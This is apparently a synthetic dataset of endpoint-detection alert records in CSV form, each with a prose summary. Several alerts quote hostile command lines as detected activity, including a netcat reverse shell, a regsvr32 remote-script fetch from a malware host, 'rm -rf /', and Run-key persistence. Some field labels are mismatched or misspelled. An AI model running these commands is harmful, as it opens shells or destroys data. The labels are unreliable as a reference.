event_id,event_type,event_timestamp,event_category,event_description,severity,event_time,category,mitre_technique,host,event_severity,affected_hosts,event_details,action,detect_description,detect_id,technique,src_ip,src_port,protocol,user_name,process_name,technique_name,affected_host,affected_process,affected_file_path,command_line,parent_process,parent_process_command_line,detection_method,recommended_actions,event_version,event_data,event_name,endpoint,data,rule_name,recommendation,event_subtype,container_name,image_name,image_digest,registry,command,source_ip,destination_ip,process_path,username,detection,actor,host_info,event_url,event_hash,detected_by,details,device,source,target,attack_name,tactic,ip_address,process_id,metadata,alert_type,timestamp,detection_info,sensor_id,hostname,ip,user,domain,process_command_line,process_pid,parent_process_name,parent_process_pid,c2,files,detection_source,web_server_url,web_server_method,type,process,network,event,trigger,remediation,artifact_hiding,process_injection,security_control_disablement,file_deletion,name,affected_entities,dst_ip,kill_chain_phases,file,process_execution,registry_modification,cloud_infrastructure_modification,subtype,detection_details,customer_id,event_info,product,mitre,attack_details,description,destination_port,parent_process_id,email_sender,email_recipient,email_subject,email_urls,email_attachments,Severity,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,Recommendation,Title,Tactic,Technique,Affected_Image_Path,Injected_Process_Name,Parent_Process_Name,Injection_Technique,indicators,actions,additional_info,file_info,network_info,Timestamp,Description,Loader_Process_Name,Loader_Technique,event_Source,tactics,recommendations,ip_addresses,mac_addresses,operating_system,agent_version,group_name,destination,threat_severity,threat_category,threat_name,ioc,tags,detect_name,rule_description,triggered_rule,alert_rule_name,alert_rule_id,alert_state,alert_time,src,process_tree,remediation_steps,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,EventID,Category,AffectedHostInfo,DetectionDetails,endpoint_id,web_service_name,web_service_path,ioc_type,ioc_value,process_details,host_details,DetectionId,Details,event_action,event_source,status,application,threat,source_port,file_write,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFilePath,AffectedFileSize,technique_id,event_creator,subtechnique_id,subtechnique,remote_server,mitre_attack_id,cloud_account,org_id,event_event_name,data_source,device_name,file_name,file_size,src_path,dst_path,host_name,file_path,md5_hash,sha256_hash,alert_data,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,file_permission_modification,Domain_Controller_IP,Domain_Controller_Name,combined_data
030333333,,2023-03-10T10:30:00Z,Obfuscated Files or Information,A suspicious file has been detected that appears to be obfuscated or encoded.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,hostname123,C:\Program Files\Malware\malware.exe,CrowdStrike Falcon,Isolate the affected host and perform a forensic analysis of the file to determine the nature and purpose of the obfuscation.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 030333333. event_timestamp is 2023-03-10T10:30:00Z. event_category is Obfuscated Files or Information. event_description is A suspicious file has been detected that appears to be obfuscated or encoded.. Severity is High. Affected_Hostname is hostname123. Affected_File_Path is C:\Program Files\Malware\malware.exe. Alert_Source is CrowdStrike Falcon. Recommendation is Isolate the affected host and perform a forensic analysis of the file to determine the nature and purpose of the obfuscation.. 
095030332,RemovableMediaDetection,2022-03-04T10:25:00Z,External Media Replication,An external device has been detected that may be attempting to replicate data to the endpoint.,high,,,,,,,,,,,,,,,,,Replication Through Removable Media,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Initial Access,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,USB Device,SanDisk,USB flash drive,123456.0,16 GB,2022-03-04T10:25:00Z,Copied Files,C:\Users\User\Documents\SensitiveData.docx,2 MB,T1091,{'type': 'Endpoint Monitoring'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 095030332. event_type is RemovableMediaDetection. event_timestamp is 2022-03-04T10:25:00Z. event_category is External Media Replication. event_description is An external device has been detected that may be attempting to replicate data to the endpoint.. severity is high. technique_name is Replication Through Removable Media. tactic is Initial Access. RemovableMediaName is USB Device. RemovableMediaVendor is SanDisk. RemovableMediaType is USB flash drive. RemovableMediaCapacity is 16 GB. RemovableMediaAccessedTime is 2022-03-04T10:25:00Z. RemovableMediaAction is Copied Files. AffectedFilePath is C:\Users\User\Documents\SensitiveData.docx. AffectedFileSize is 2 MB. technique_id is T1091. event_creator type is Endpoint Monitoring. 
ABC123-1234-5678-9101-23456789,threat_detection,2022-03-07T14:23:54.123Z,resource hijacking,An attempt to hijack system resources has been detected on the endpoint.,,,,,,critical,,,,,,Resource Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Resource Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'type': 'host', 'id': '123456', 'name': 'DESKTOP-1234', 'ip_addresses': ['192.168.1.100'], 'os_type': 'Windows'}]",,,,,,,,,,,,,,A suspicious process is attempting to hijack system resources on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'explorer.exe', 'target_resource': 'memory', 'operation': 'write', 'suspicious_action': 'attempt to overwrite critical memory region'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1496,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is ABC123-1234-5678-9101-23456789. event_type is threat_detection. event_timestamp is 2022-03-07T14:23:54.123Z. event_category is resource hijacking. event_description is An attempt to hijack system resources has been detected on the endpoint.. event_severity is critical. technique is Resource Hijacking. tactic is Resource Hijacking. affected_entities type is host. affected_entities id is 123456. affected_entities name is DESKTOP-1234. affected_entities ip_addresses is ['192.168.1.100']. affected_entities os_type is Windows. description is A suspicious process is attempting to hijack system resources on the endpoint.. additional_info process_name is explorer.exe. additional_info target_resource is memory. additional_info operation is write. additional_info suspicious_action is attempt to overwrite critical memory region. technique_id is T1496. 
12345678-1234-1234-1234-123456789012,alert,2023-03-08T14:30:00Z,scheduled Transfer,Scheduled Transfer Detected,,,,,,medium,,,,,,,,,,,cmd.exe,,,,,robocopy C:\LocalFolder \\RemoteServer\Share /E,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234.0,,,,,,,,,,,,,,,,CrowdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\RemoteServer\Share,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345678-1234-1234-1234-123456789012. event_type is alert. event_timestamp is 2023-03-08T14:30:00Z. event_category is scheduled Transfer. event_description is Scheduled Transfer Detected. event_severity is medium. process_name is cmd.exe. command_line is robocopy C:\LocalFolder \\RemoteServer\Share /E. detection_source is CrowdStrike Falcon. remote_server is \\RemoteServer\Share. 
0930405555,detect,2023-03-03T10:15:30Z,serverless execution,Potential serverless execution detected via PowerShell execution with encoded command.,,,,,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'powershell.exe', 'process_command_line': '-EncodedCommand', 'parent_process_name': 'cmd.exe', 'parent_command_line': 'powershell.exe -encodedCommand', 'process_sha256': '9D73B2CF2A1C728FE8B282FDC7EE5DE5', 'parent_sha256': '2E20D26F9C1ACB5547D5BDA70FEBD054', 'status': 'blocked'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 0930405555. event_type is detect. event_timestamp is 2023-03-03T10:15:30Z. event_category is serverless execution. event_description is Potential serverless execution detected via PowerShell execution with encoded command.. event_severity is high. process process_name is powershell.exe. process process_command_line is -EncodedCommand. process parent_process_name is cmd.exe. process parent_command_line is powershell.exe -encodedCommand. process process_sha256 is 9D73B2CF2A1C728FE8B282FDC7EE5DE5. process parent_sha256 is 2E20D26F9C1ACB5547D5BDA70FEBD054. process status is blocked. 
12345678-1234-1234-1234-123456789012,alert,2023-03-08T14:30:00Z,transfer data to cloud,Data Transfer to Cloud Account Detected,,,,,,high,,,,,,,,,,,powershell.exe,,,,,Copy-Item C:\LocalFolder -Destination https://mycloudstorage.com/myfolder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5678.0,,,,,,,,,,,,,,,,CorwdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1537,https://mycloudstorage.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345678-1234-1234-1234-123456789012. event_type is alert. event_timestamp is 2023-03-08T14:30:00Z. event_category is transfer data to cloud. event_description is Data Transfer to Cloud Account Detected. event_severity is high. process_name is powershell.exe. command_line is Copy-Item C:\LocalFolder -Destination https://mycloudstorage.com/myfolder. detection_source is CorwdStrike Falcon. mitre_attack_id is T1537. cloud_account is https://mycloudstorage.com. 
04040t0y,threat detection,,Suspicious Use of Valid Accounts Detected,Suspicious activity involving the use of valid accounts was detected on an endpoint.,high,2023-03-03T15:30:00Z,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,suspicious_activity,,,,,,,,,,,,,"[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345.0,valid_accounts,"{'provider': 'Crowdstrike Falcon', 'type': 'endpoint_detection_and_response'}",,,,,,,,,,,,,,,,,,,,,,,,,event_id is 04040t0y. event_type is threat detection. event_category is Suspicious Use of Valid Accounts Detected. event_description is Suspicious activity involving the use of valid accounts was detected on an endpoint.. severity is high. event_time is 2023-03-03T15:30:00Z. type is suspicious_activity. kill_chain_phases kill_chain_name is mitre-attack. kill_chain_phases phase_name is command-and-control. event_event_name is valid_accounts. data_source provider is Crowdstrike Falcon. data_source type is endpoint_detection_and_response. 
98765,Build image on host,2023-03-10T10:30:00Z,removable_media,,high,,,,,,,,,"A removable media device was inserted and a file transfer occurred, which is commonly associated with data exfiltration or other suspicious activity.",789012.0,Communication Through Removable Media,,,,user1,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,USB Drive,confidential.docx,3.5MB,D:\confidential.docx,C:\Users\user1\Documents\confidential.docx,,,,,,,,,,,,,,,,,,,,"event_id is 98765. event_type is Build image on host. event_timestamp is 2023-03-10T10:30:00Z. event_category is removable_media. severity is high. detect_description is A removable media device was inserted and a file transfer occurred, which is commonly associated with data exfiltration or other suspicious activity.. technique is Communication Through Removable Media. user_name is user1. process_name is explorer.exe. device_name is USB Drive. file_name is confidential.docx. file_size is 3.5MB. src_path is D:\confidential.docx. dst_path is C:\Users\user1\Documents\confidential.docx. "
12345,alert,1646749655000,suspicous container,"A container has been deployed on the system, potentially indicating malicious activity.",High,,,,,,,,,,,Deploy Container,,,,john.doe,docker,,,,,docker run malicious/image,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,192.168.1.100,5678.0,,,2023-03-10T10:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,example.com,/usr/bin/docker,f1ef997989e37c17eb2a12d56a9ac05d,098f6bcd4621d373cade4e832627b4f6,,,,,,,,,,,,,,,,"event_id is 12345. event_type is alert. event_timestamp is 1646749655000. event_category is suspicous container. event_description is A container has been deployed on the system, potentially indicating malicious activity.. severity is High. technique is Deploy Container. user_name is john.doe. process_name is docker. command_line is docker run malicious/image. tactic is Defense Evasion. ip_address is 192.168.1.100. timestamp is 2023-03-10T10:00:00Z. host_name is example.com. file_path is /usr/bin/docker. md5_hash is f1ef997989e37c17eb2a12d56a9ac05d. sha256_hash is 098f6bcd4621d373cade4e832627b4f6. "
EDR-23456,Masked Executable,,masked exectuiable,Masked executable detected on host LAPTOP-789,,2022-10-31T12:34:56Z,,,,High,"[{'host_name': 'LAPTOP-789', 'ip_address': '192.168.1.150'}]","{'file_path': 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\mask123.exe', 'source_ip': '192.168.1.151', 'destination_ip': '192.168.1.150'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is EDR-23456. event_type is Masked Executable. event_category is masked exectuiable. event_description is Masked executable detected on host LAPTOP-789. event_time is 2022-10-31T12:34:56Z. event_severity is High. affected_hosts host_name is LAPTOP-789. affected_hosts ip_address is 192.168.1.150. event_details file_path is C:\Users\jdoe\AppData\Local\Temp\mask123.exe. event_details source_ip is 192.168.1.151. event_details destination_ip is 192.168.1.150. 
032040ttvf,detect,2023-03-10T20:00:00Z,registry_modification,,high,,,,{'hostname': 'desktop01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized modification of registry key'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,,,,,,,,"{'registry_key': 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'modification_type': 'value_added', 'value_name': 'MaliciousProgram', 'value_data': 'C:\\Program Files\\Malicious\\malware.exe'}",,,,,,,,,An attempt to modify registry keys or values.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 032040ttvf. event_type is detect. event_timestamp is 2023-03-10T20:00:00Z. event_category is registry_modification. severity is high. host hostname is desktop01. detection reason is Unauthorized modification of registry key. user username is user01. registry_modification registry_key is HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run. registry_modification modification_type is value_added. registry_modification value_name is MaliciousProgram. registry_modification value_data is C:\Program Files\Malicious\malware.exe. description is An attempt to modify registry keys or values.. 
040506yg,comand and control,2023-03-09T12:00:00.000000Z,multi stage channels,Multi-Stage Command and Control,,,,,,high,,,,,,Multi-Stage Channels,,,TCP,,svchost.exe,,,,,,,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,Command and Control,,1234.0,,,,,,,,DOMAIN\user,,C:\Windows\System32\svchost.exe -k netsvcs,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443.0,5678.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 040506yg. event_type is comand and control. event_timestamp is 2023-03-09T12:00:00.000000Z. event_category is multi stage channels. event_description is Multi-Stage Command and Control. event_severity is high. technique is Multi-Stage Channels. protocol is TCP. process_name is svchost.exe. parent_process_command_line is C:\Windows\explorer.exe. source_ip is 192.168.1.100. destination_ip is 10.0.0.2. tactic is Command and Control. user is DOMAIN\user. process_command_line is C:\Windows\System32\svchost.exe -k netsvcs. parent_process_name is explorer.exe. 
12345,Remote Access Tools Detection,1646749655000,remote access,Remote access tool detected on the system.,High,2023-03-09T10:30:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_type': 'Host', 'entity_name': 'workstation-01', 'entity_ip': '192.168.1.100'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'nc.exe', 'process_path': 'C:\\Windows\\System32\\nc.exe', 'process_command_line': 'nc.exe -e cmd.exe 10.0.0.2 4444', 'process_hash': 'A2D3F4B5C6E7A8B9', 'process_parent_name': 'cmd.exe', 'process_parent_path': 'C:\\Windows\\System32\\cmd.exe', 'process_parent_hash': 'B9A8E7C6B5F4D3A2', 'network_connections': [{'destination_ip': '10.0.0.2', 'destination_port': '4444', 'protocol': 'TCP'}]}",,,,,,,,,,,,,,,"event_id is 12345. event_type is Remote Access Tools Detection. event_timestamp is 1646749655000. event_category is remote access. event_description is Remote access tool detected on the system.. severity is High. event_time is 2023-03-09T10:30:00Z. affected_entities entity_type is Host. affected_entities entity_name is workstation-01. affected_entities entity_ip is 192.168.1.100. alert_data process_name is nc.exe. alert_data process_path is C:\Windows\System32\nc.exe. alert_data process_command_line is nc.exe -e cmd.exe 10.0.0.2 4444. alert_data process_hash is A2D3F4B5C6E7A8B9. alert_data process_parent_name is cmd.exe. alert_data process_parent_path is C:\Windows\System32\cmd.exe. alert_data process_parent_hash is B9A8E7C6B5F4D3A2. alert_data network_connections is {'destination_ip': '10.0.0.2', 'destination_port': '4444', 'protocol': 'TCP'}. "
ac4d6c4c6e68488f903a4a10b3c152b2,DetectionSummaryEvent,2023-03-06T15:32:00.000Z,exfiltration,,medium,,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'customer_id': '123456', 'customer_name': 'Acme Corp', 'source': 'CrowdStrike Falcon Platform'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Automated exfiltration attempt detected,,,,,,,,,,,,,,,,,,,,,,,"{'protocol': 'https', 'destination_ip': '10.0.0.2', 'destination_port': 443, 'filename': 'sensitive_data.zip', 'file_hash': 'abcd1234', 'file_size': 1024}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Workstation01,,,,,,,,,,ac4d6c4c6e68488f903a4a10b3c152b2,2023-03-06T15:30:00.000Z,85.0,80.0,d1b31397857945a9a3c3f918a3a7a1e8,192.168.1.101,Windows 10 Pro,20H2,Default Policy,4bd7e4c2-4a3f-4dd2-b00b-1c4139c617d6,automated_exfiltration,,,,event_id is ac4d6c4c6e68488f903a4a10b3c152b2. event_type is DetectionSummaryEvent. event_timestamp is 2023-03-06T15:32:00.000Z. event_category is exfiltration. severity is medium. metadata customer_id is 123456. metadata customer_name is Acme Corp. metadata source is CrowdStrike Falcon Platform. description is Automated exfiltration attempt detected. additional_info protocol is https. additional_info destination_ip is 10.0.0.2. additional_info filename is sensitive_data.zip. additional_info file_hash is abcd1234. device_name is Workstation01. detection_id is ac4d6c4c6e68488f903a4a10b3c152b2. detection_time is 2023-03-06T15:30:00.000Z. device_id is d1b31397857945a9a3c3f918a3a7a1e8. device_external_ip is 192.168.1.101. device_os is Windows 10 Pro. device_os_version is 20H2. policy_name is Default Policy. policy_id is 4bd7e4c2-4a3f-4dd2-b00b-1c4139c617d6. subcategory is automated_exfiltration. 
EDR-24680,,,Suspiciouis Browser Extension,Browser extension installed on Chrome,,2022-10-15T09:45:00Z,,,,Medium,"[{'host_name': 'LAPTOP-789', 'ip_address': '192.168.1.50'}]","{'extension_name': 'AdBlock Plus', 'browser': 'Chrome', 'browser_version': '95.0.4638.69', 'username': 'jdoe', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.51', 'destination_ip': '192.168.1.50'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is EDR-24680. event_category is Suspiciouis Browser Extension. event_description is Browser extension installed on Chrome. event_time is 2022-10-15T09:45:00Z. event_severity is Medium. affected_hosts host_name is LAPTOP-789. affected_hosts ip_address is 192.168.1.50. event_details extension_name is AdBlock Plus. event_details browser is Chrome. event_details browser_version is 95.0.4638.69. event_details username is jdoe. event_details domain is MYDOMAIN. event_details source_ip is 192.168.1.51. event_details destination_ip is 192.168.1.50. 
EDR-67890,Forced Container Administration Command,,forced container administration,Forced container administration command detected on host server01,,2022-12-31T23:59:59Z,,,,High,"[{'host_name': 'server01', 'ip_address': '192.168.1.100'}]","{'container_name': 'webapp', 'command': 'rm -rf /', 'source_process': 'docker', 'source_process_commandline': 'docker exec -it webapp /bin/bash', 'source_process_pid': '1234', 'source_ip': '192.168.1.101', 'destination_ip': '192.168.1.100', 'result': 'Success'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is EDR-67890. event_type is Forced Container Administration Command. event_category is forced container administration. event_description is Forced container administration command detected on host server01. event_time is 2022-12-31T23:59:59Z. event_severity is High. affected_hosts host_name is server01. affected_hosts ip_address is 192.168.1.100. event_details container_name is webapp. event_details command is rm -rf /. event_details source_process is docker. event_details source_process_commandline is docker exec -it webapp /bin/bash. event_details source_process_pid is 1234. event_details source_ip is 192.168.1.101. event_details destination_ip is 192.168.1.100. event_details result is Success. 
lllkdl0,detect,2023-03-10T18:00:00Z,process_execution,An attempt to execute a command using a legitimate system tool to evade detection.,medium,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized command execution'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'regsvr32.exe', 'command_line': 'regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is lllkdl0. event_type is detect. event_timestamp is 2023-03-10T18:00:00Z. event_category is process_execution. event_description is An attempt to execute a command using a legitimate system tool to evade detection.. severity is medium. host hostname is server01. detection reason is Unauthorized command execution. user username is user01. process_execution process_name is regsvr32.exe. process_execution command_line is regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll. 
12345,alert,1646749655000,Potential Use of Scheduled Task/Job,A scheduled task/job was created or modified on the system.,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_type': 'system_process', 'entity_name': 'Task Scheduler', 'host_info': {'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.100'}, 'description': 'A new scheduled task/job was created or modified on the system.'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 12345. event_type is alert. event_timestamp is 1646749655000. event_category is Potential Use of Scheduled Task/Job. event_description is A scheduled task/job was created or modified on the system.. severity is high. affected_entities entity_type is system_process. affected_entities entity_name is Task Scheduler. affected_entities host_info is {'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.100'}. affected_entities description is A new scheduled task/job was created or modified on the system.. "
9039r9fj,detect,2023-03-10T13:00:00Z,file_permission_modification,A file or directory permission was modified by an unauthorized user or process.,medium,,,,{'hostname': 'workstation01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized file permission change'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'file_path': 'C:\\Windows\\system32\\config\\SAM', 'target_user': 'SYSTEM', 'original_permissions': 'Full Control', 'new_permissions': 'Read-only'}",,,event_id is 9039r9fj. event_type is detect. event_timestamp is 2023-03-10T13:00:00Z. event_category is file_permission_modification. event_description is A file or directory permission was modified by an unauthorized user or process.. severity is medium. host hostname is workstation01. detection reason is Unauthorized file permission change. user username is user01. file_permission_modification file_path is C:\Windows\system32\config\SAM. file_permission_modification target_user is SYSTEM. file_permission_modification original_permissions is Full Control. file_permission_modification new_permissions is Read-only. 
